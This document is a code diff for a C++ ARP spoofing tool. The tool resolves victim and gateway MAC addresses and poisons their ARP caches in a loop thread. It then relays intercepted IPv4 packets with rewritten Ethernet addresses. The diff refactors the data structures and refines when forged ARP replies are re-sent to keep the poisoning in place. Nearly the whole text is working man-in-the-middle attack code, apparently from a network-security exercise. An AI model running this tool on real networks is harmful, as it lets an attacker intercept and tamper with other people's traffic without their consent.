@@ -8,6 +8,7 @@
 #include <algorithm>
 #include <map>
 #include <thread>
+#include <libnet.h>
 
 #pragma pack(push, 1)
 struct EthArpPacket final {
@@ -16,10 +17,11 @@ struct EthArpPacket final {
 };
 #pragma pack(pop)
 
-struct IP_MAC{
+struct Flow{
     Ip sip_;
+    Mac smac_;
     Ip tip_;
-    Mac mac_;
+    Mac tmac_;
 };
 
 
@@ -28,11 +30,11 @@ void usage() {
     printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
 }
 
-int get_my_MAC(Mac *result, char *interface_name){
+Mac get_my_MAC(char *interface_name){
     char filename[100] = "/sys/class/net/";
     if(sizeof(interface_name) > 80){
         fprintf(stderr, "interface name is too long\n");
-        return -1;
+        return Mac::nullMac();
     }
     strcat(filename, interface_name);
     strncat(filename, "/address", 9);
@@ -41,18 +43,18 @@ int get_my_MAC(Mac *result, char *interface_name){
     int ret = fscanf(my_net_file, "%s", addr);
     if(ret == EOF){
         fprintf(stderr, "cannot find address file");
-        return -1;
+        return Mac::nullMac();
     }
-    *result = Mac(addr);
-    return 0;
+
+    return Mac(addr);
 }
 
-int get_my_IP(Ip *result, char *interface_name){
+Ip get_my_IP(char *interface_name){
     struct ifaddrs *myaddrs;
     int ret = getifaddrs(&myaddrs);
     if(ret == EOF){
         fprintf(stderr, "cannot find my ip addr");
-        return -1;
+        return Ip::nullIp();
     }
     struct ifaddrs *tmp = myaddrs;
     while(tmp){
@@ -63,11 +65,10 @@ int get_my_IP(Ip *result, char *interface_name){
     }
     if(!tmp){
         fprintf(stderr, "cannot find interface");
-        return -1;
+        return Ip::nullIp();
     }
     sockaddr_in *myaddr = (sockaddr_in *)(tmp->ifa_addr);
-    *result = Ip(ntohl(myaddr->sin_addr.s_addr));
-    return 0;
+    return Ip(ntohl(myaddr->sin_addr.s_addr));
 }
 
 int sendARP_req(pcap_t *handle, Mac smac, Ip sip, Ip tip){
@@ -152,7 +153,7 @@ int resolve_mac(Mac *result, pcap_t *handle, Mac smac, Ip sip, Ip tip){
     return -1;
 }
 
-void ARPInfect(pcap_t *handle, Mac *sender_addr_Mac, Mac attackerMac, std::map<Mac, IP_MAC> senderMac_target_Map, unsigned int len){
+void ARPInfect(pcap_t *handle, Mac *sender_addr_Mac, Mac attackerMac, std::map<Mac, Flow> senderMac_target_Map, unsigned int len){
     while(1){
         for(unsigned int i=0;i<len;i++){
             sendARP_reply(handle, sender_addr_Mac[i], attackerMac, senderMac_target_Map[sender_addr_Mac[i]].tip_, senderMac_target_Map[sender_addr_Mac[i]].sip_);
@@ -180,24 +181,24 @@ int main(int argc, char *argv[]) {
 
     int ret;
 
-    ret = get_my_MAC(&attacker_mac, dev);
-    if (ret != 0){
+    attacker_mac = get_my_MAC(dev);
+    if (attacker_mac == Mac::nullMac()){
         fprintf(stderr, "couldn't find my MAC\n");
         return -1;
     }
 
-    ret = get_my_IP(&attacker_ip, dev);
-    if (ret != 0){
+    attacker_ip = get_my_IP(dev);
+    if (attacker_ip == Ip::nullIp()){
         fprintf(stderr, "couldn't find my IP\n");
         return -1;
     }
 
     Mac *sender_addr_Mac;
     sender_addr_Mac = new Mac[(argc-2) / 2];
-    std::map<Mac, IP_MAC> senderMac_target_Map;
+    std::map<Mac, Flow> senderMac_Flow_Map;
 
     for(int i=0;i<argc-2;i++){
-        IP_MAC target;
+        Flow target;
         if (i%2 == 0){
             ret = resolve_mac(sender_addr_Mac+i/2, handle, attacker_mac, attacker_ip, Ip(argv[i+2]));
             if (ret != 0){
@@ -205,22 +206,24 @@ int main(int argc, char *argv[]) {
                 return -1;
             }
             target.sip_ = Ip(argv[i+2]);
+            target.smac_ = *(sender_addr_Mac+i/2);
         }
         else{
-            ret = resolve_mac(&(target.mac_), handle, attacker_mac, attacker_ip, Ip(argv[i+2]));
+            ret = resolve_mac(&(target.tmac_), handle, attacker_mac, attacker_ip, Ip(argv[i+2]));
             if (ret != 0){
                 fprintf(stderr, "couldn't find Mac addr of %s\n", argv[i+2]);
                 return -1;
             }
             target.tip_ = Ip(argv[i+2]);
-            senderMac_target_Map.insert(std::pair<Mac, IP_MAC>(sender_addr_Mac[i/2], target));
+            senderMac_Flow_Map.insert(std::pair<Mac, Flow>(sender_addr_Mac[i/2], target));
         }
     }
 
-    std::thread t1(ARPInfect, handle, sender_addr_Mac, attacker_mac, senderMac_target_Map, (argc-2)/2);
+    std::thread t1(ARPInfect, handle, sender_addr_Mac, attacker_mac, senderMac_Flow_Map, (argc-2)/2);
 
     PEthHdr ethernet;
     PArpHdr arp;
+    libnet_ipv4_hdr *ipv4;
 
     struct pcap_pkthdr *header;
     const u_char *packet;
@@ -239,10 +242,13 @@ int main(int argc, char *argv[]) {
         p = std::find(sender_addr_Mac, sender_addr_Mac+(argc-2)/2, ethernet->smac());
         if(p == sender_addr_Mac+(argc-2)/2) continue;
         if(ethernet->type() == EthHdr::Ip4){
+            ipv4 = (libnet_ipv4_hdr *)(packet + 14);
+            if(Ip(ipv4->ip_dst.s_addr) == attacker_ip) continue;
+
             tmpPacket = new u_char[header->caplen];
             memcpy(tmpPacket, packet, header->caplen);
             ethernet = (PEthHdr)tmpPacket;
-            ethernet->dmac_ = senderMac_target_Map[ethernet->smac()].mac_;
+            ethernet->dmac_ = senderMac_Flow_Map[ethernet->smac()].tmac_;
             ethernet->smac_ = attacker_mac;
             int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(tmpPacket), header->caplen);
             if (res != 0) {
@@ -252,8 +258,14 @@ int main(int argc, char *argv[]) {
 
         } else if (ethernet->type() == EthHdr::Arp){
             arp = (PArpHdr)(packet + sizeof(*ethernet));
-            if (arp->op() != ArpHdr::Request) continue;
-            sendARP_reply(handle, *p, attacker_mac, senderMac_target_Map[*p].tip_, senderMac_target_Map[*p].sip_);
+            bool infect = false;
+            if (arp->op() == ArpHdr::Request){
+                if (arp->sip() == senderMac_Flow_Map[*p].sip_ && arp->tip() == senderMac_Flow_Map[*p].tip_)
+                    infect = true;
+                else if (arp->sip() == senderMac_Flow_Map[*p].tip_ && ethernet->dmac() == Mac::broadcastMac())
+                    infect = true;
+            }
+            if (infect) sendARP_reply(handle, *p, attacker_mac, senderMac_Flow_Map[*p].tip_, senderMac_Flow_Map[*p].sip_);
         }
     }
 
